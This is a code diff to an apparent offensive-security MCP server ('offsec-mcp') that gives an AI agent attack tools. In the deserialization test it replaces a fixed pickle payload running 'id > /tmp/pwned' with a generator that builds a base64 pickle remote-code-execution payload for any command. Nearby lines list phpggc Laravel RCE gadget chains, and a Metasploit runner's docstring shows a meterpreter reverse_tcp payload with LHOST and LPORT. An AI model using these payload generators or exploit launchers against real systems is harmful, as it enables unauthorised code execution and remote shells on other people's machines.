@@ -13,6 +13,8 @@ import urllib.parse
 from datetime import datetime
 from pathlib import Path
 from mcp.server.fastmcp import FastMCP
+import shutil
+import pickle, io
 
 mcp = FastMCP("offsec-mcp")
 
@@ -796,14 +798,13 @@ def deserialization_test(target: str, platform: str, callback_host: str = "") ->
         results.append("[PHP] Check for POP chains using phpggc:\n  phpggc -l\n  phpggc Laravel/RCE1 system id | base64")
 
     elif platform == "python":
-        import pickle, io
-        class RCEPayload:
-            def __reduce__(self):
-                return (os.system, ("id > /tmp/pwned",))
-        buf = io.BytesIO()
-        pickle.dump(RCEPayload(), buf)
-        encoded = base64.b64encode(buf.getvalue()).decode()
-        results.append(f"[PYTHON - pickle RCE]\nBase64 payload (runs 'id > /tmp/pwned'):\n{encoded}")
+        def make_pickle_payload(cmd: str) -> bytes:
+            class Exploit:
+                def __reduce__(self):
+                    return (__import__('os').system, (cmd,))
+            return pickle.dumps(Exploit())
+        encoded = base64.b64encode(make_pickle_payload("id")).decode()
+        results.append(f"[PYTHON - pickle RCE]\nBase64 payload (runs 'id'):\n{encoded}")
         results.append("[PYTHON] Also check: PyYAML load(), jsonpickle, shelve, marshal")
 
     elif platform == "nodejs":
@@ -1685,7 +1686,7 @@ def run_metasploit(module: str, options: dict) -> str:
     options: {'LHOST':'10.0.0.1','LPORT':'4444','PAYLOAD':'linux/x64/meterpreter/reverse_tcp'}
     """
     opts = "\n".join([f"set {k} {v}" for k, v in options.items()])
-    msf_cmd = f"use {module}\n{opts}\nrun -j\nexit"
+    msf_cmd = f"use {module}\n{opts}\nrun \nexit"
     result = run(["msfconsole", "-q", "-x", msf_cmd], timeout=60)
     log("metasploit", module, "executed")
     return result
